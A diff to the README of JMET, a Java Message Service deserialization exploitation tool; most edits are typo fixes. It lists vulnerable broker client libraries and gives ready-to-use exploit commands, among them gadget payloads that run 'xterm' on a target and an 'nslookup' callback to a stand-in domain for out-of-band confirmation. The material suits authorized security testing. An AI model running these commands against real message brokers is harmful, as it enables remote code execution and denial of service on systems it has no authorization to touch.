@@ -8,15 +8,15 @@ The Java Message Exploitation Tool
 \____/_/  /_/_____/ /_/
 ```
 
-# Decription
-JMET was released at Blackhat USA 2016 and is outcome of Code White's research
-efforts presented in the talk "Pwning Your Java Messaging With
+# Description
+JMET was released at Blackhat USA 2016 and is an outcome of Code White's research
+effort presented in the talk "Pwning Your Java Messaging With
 Deserialization Vulnerabilities".
 The goal of JMET is to make the exploitation of the Java Message Service (JMS) easy.
 In the talk more than 12 JMS client implementations where shown, vulnerable to
 deserialization attacks.
-The specific deserialization vulnerabilities were found in implementations
-of javax.jms.ObjectMessage message-types.
+The specific deserialization vulnerabilities were found in ObjectMessage implementations
+(classes implementing javax.jms.ObjectMessage).
 The following more or less complete list shows the vulnerable JMS broker client
 libraries:
 * Apache ActiveMQ
@@ -32,8 +32,7 @@ libraries:
 * Apache QPID Client
 * Amazon SQS Java Messaging
 
-For creation of gadgets used in the exploitation of deserialization vulnerabilities
-JMET makes use of Chris Frohoffs' Ysoserial.
+For creating gadget payloads JMET makes use of Chris Frohoffs' Ysoserial.
 
 # Supprted JMS client libraries
 * Apache ActiveMQ
@@ -91,7 +90,7 @@ usage: jmet [host] [port]
  -Zv,--vhost <name>               vhost name (only AMQP-Brokers:
                                   RabbitMQ|QPid09|QPid10)
 ```
-## Gadget exploiation mode
+## Gadget exploitation mode
 Create gadgets for executing "xterm" and send them all to queue "event".
 As implementation ActiveMQ is choosen, the target system is "jmstarget" listening
 on port 61616.
@@ -99,8 +98,8 @@ on port 61616.
 $ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -Y xterm jmstarget 61616
 ```
 To find out which gadget was executed you can use the "substitution"-mode with
- an Out-Of-Band channel like DNS. To pass the gadget name to your command to be
-  executed use the "§§" string which then gets substituted with the gadget name.
+ an out-of-band channel like DNS. To pass the gadget name to your command use
+ the "§§" string which then gets substituted with the gadget name.
 
 ```bash
 $ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "nslookup §§.yourdomain.com" jmstarget 61616
@@ -113,13 +112,13 @@ $ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -X http://192.168.85.148:808
 ```
 ## Custom exploitation mode
 The custom exploitation mode allows to run a custom JavaScript script.
-The purpose of this mode is to support different serialization formats (JSON,etc.)
+The purpose of this mode is to support different serialization formats (JSON, etc.)
 and custom payloads.
 
-The following example script uses the XML (de)serialization library XStream.
+The following example script uses the XML serialization library XStream.
 The String "Object" is serialized to XML and put into an TextMessage using the
 de.codewhite.jmet.target.JMSTarget.addTextPayload(String payloadName, String payloadText)-method.
-Required libraries need to be places into the "external"-directory of JMET.
+Required libraries need to be put into the "external"-directory of JMET.
 ```javascript
 function payload(target){
 
@@ -159,7 +158,8 @@ directory of your choice (e.g. DIR).
 
 Then invoke maven with the property "commercial" set to your path.
 ```bash
-mvn clean compile assembly:single -Dcommerical=DIR
+$ export MAVEN_OPTS=-Xss10m
+$ mvn clean compile assembly:single -Dcommerical=DIR
 ```
 
 If you don't want to use the commercial brokers at all you can just delete
@@ -168,13 +168,14 @@ the following files:
 * src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java
 
 ```bash
-  mvn clean compile assembly:single
+$ export MAVEN_OPTS=-Xss10m
+$ mvn clean compile assembly:single
 ```
 # Disclaimer
 JMET is a proof-of-concept tool for blackbox testing of JMS destinations.
 Please use this tool with care and only when authorized.
-Be aware that sending a invalid to a JMS destination might result in a denial-of-service
- state(DOS) of the target system.
+Be aware that sending an invalid message to a JMS destination might result in a denial-of-service
+ state (DOS) of the target system.
  You have been warned !!!
 
 # License
